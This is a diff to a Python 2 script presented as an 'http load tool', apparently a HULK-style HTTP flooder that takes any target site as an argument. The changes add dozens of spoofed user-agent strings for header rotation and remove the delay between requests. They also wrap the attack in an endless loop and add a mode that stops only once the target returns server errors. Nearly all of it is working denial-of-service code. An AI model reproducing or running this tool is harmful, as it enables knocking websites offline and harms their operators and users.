@@ -14,19 +14,18 @@ flag=0
 usageinter = '''command to type:
 python2 http.py https://www.examplesite.com
 '''
-logo = """
-          ____
-         |    |
-         |    |
-        _|    |_
-       /########\
-      |# * ## * #|
-      |##########|
-       \########/
-        \#\__/#/
-         \####/   <Slowhttpreq tool>
-          ''''   <Tool created by: Themobilehacker>
-"""
+logo = '''
+   \ dumping http /
+    \  requests  /
+     \   ...    /
+      \        /
+       \      /             <http load tool>
+        |    |        <created by:themobilehacker>
+       /      \         
+      /        \
+     http requests
+'''
+
 def inc_counter():
 	global request_counter
 	request_counter+=1
@@ -65,6 +64,44 @@ def useragent_list():
 	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
 	headers_useragents.append('Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
 	headers_useragents.append('Mozilla/4.0 (compatible; Arachmo)')
+	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
+        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
+        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
+        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
+        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
+        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
+        headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
+        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)')
+        headers_useragents.append('Links (2.1pre15; FreeBSD 5.4-STABLE i386; 158x58)')
+        headers_useragents.append('Wget/1.8.2')
+        headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.0')
+        headers_useragents.append('Mediapartners-Google/2.1')
+        headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.5) Gecko/20031007 Firebird/0.7')
+        headers_useragents.append('Mozilla/4.04 [en] (WinNT; I)')
+        headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20060205 Galeon/2.0.0 (Debian package 2.0.0-2)')
+        headers_useragents.append('lwp-trivial/1.41')
+        headers_useragents.append('NetBSD-ftp/20031210')
+        headers_useragents.append('Dillo/0.8.5-i18n-misc')
+        headers_useragents.append('Links (2.1pre20; NetBSD 2.1_STABLE i386; 145x54)')
+        headers_useragents.append('Lynx/2.8.5rel.5 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7d')
+        headers_useragents.append('Lynx/2.8.5rel.3 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7d')
+        headers_useragents.append('Links (2.1pre19; NetBSD 2.1_STABLE sparc64; 145x54)')
+        headers_useragents.append('Lynx/2.8.6dev.15 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7d')
+        headers_useragents.append('Links (2.1pre14; IRIX64 6.5 IP27; 145x54)')
+        headers_useragents.append('Wget/1.10.1')
+        headers_useragents.append('ELinks/0.10.5 (textmode; FreeBSD 4.11-STABLE i386; 80x22-2)')
+        headers_useragents.append('Links (2.1pre20; FreeBSD 4.11-STABLE i386; 80x22)')
+        headers_useragents.append('Lynx/2.8.5rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7d-p1')
+        headers_useragents.append('Opera/8.52 (X11; Linux i386; U; de)')
+        headers_useragents.append('Mozilla/5.0 (X11; U; NetBSD i386; en-US; rv:1.8.0.1) Gecko/20060310 Firefox/1.5.0.1')
+        headers_useragents.append('Mozilla/5.0 (X11; U; IRIX64 IP27; en-US; rv:1.4) Gecko/20030711')
+        headers_useragents.append('Mozilla/4.8 [en] (X11; U; IRIX64 6.5 IP27)')
+        headers_useragents.append('Mozilla/4.76 [en] (X11; U; SunOS 5.8 sun4m)')
+        headers_useragents.append('Opera/5.0 (SunOS 5.8 sun4m; U) [en]')
+        headers_useragents.append('Links (2.1pre15; SunOS 5.8 sun4m; 80x24)')
+        headers_useragents.append('Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7d')
+        headers_useragents.append('Wget/1.8.1')
+        headers_useragents.append('Wget/1.9.1')
 	headers_useragents.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
 	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
 	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
@@ -687,34 +724,47 @@ def httpcall(url):
 	request.add_header('Host',host)
 	try:
 			urllib2.urlopen(request)
+	except urllib2.HTTPError, e:
+			set_flag(1)
+			print('60 sent')
+			code=500
 	except urllib2.URLError, e:
 			sys.exit()
 	else:
 			inc_counter()
 			urllib2.urlopen(request)
-	return(code)		
+	return(code)			
 
-if len(sys.argv) < 2:
-	usage()
-	sys.exit()
-else:
-	if sys.argv[1]=="help":
+while True:
+	if len(sys.argv) < 2:
 		usage()
 		sys.exit()
 	else:
-		print("Started")
-		print(logo)
-		url = sys.argv[1]
-		if url.count("/")==2:
-			url = url + "/"
-		m = re.search('(https?\://)?([^/]*)/?.*', url)
-		host = m.group(2)
-		for i in range(500):
-			try:
-				while flag<2:
-					time.sleep(0.5)
-					code=httpcall(url)
-					if (code==500) & (safe==1):
-						set_flag(2)
-			except Exception, ex:
-				pass
+		if sys.argv[1]=="help":
+			usage()
+			sys.exit()
+		else:
+			print "-- Started --"
+			if len(sys.argv)== 3:
+				if sys.argv[2]=="safe":
+					set_safe()
+			url = sys.argv[1]
+			if url.count("/")==2:
+				url = url + "/"
+			m = re.search('(https?\://)?([^/]*)/?.*', url)
+			host = m.group(2)
+			for i in range(500):
+				try:
+					while flag<2:
+						code=httpcall(url)
+						if (code==500) & (safe==1):
+							set_flag(2)
+				except Exception, ex:
+					pass
+			previous=request_counter
+			while flag==0:
+				if (previous+100<request_counter) & (previous<>request_counter):
+					print "%d Requests Sent" % (request_counter)
+					previous=request_counter
+			if flag==2:
+				print "\n-- Finished --"
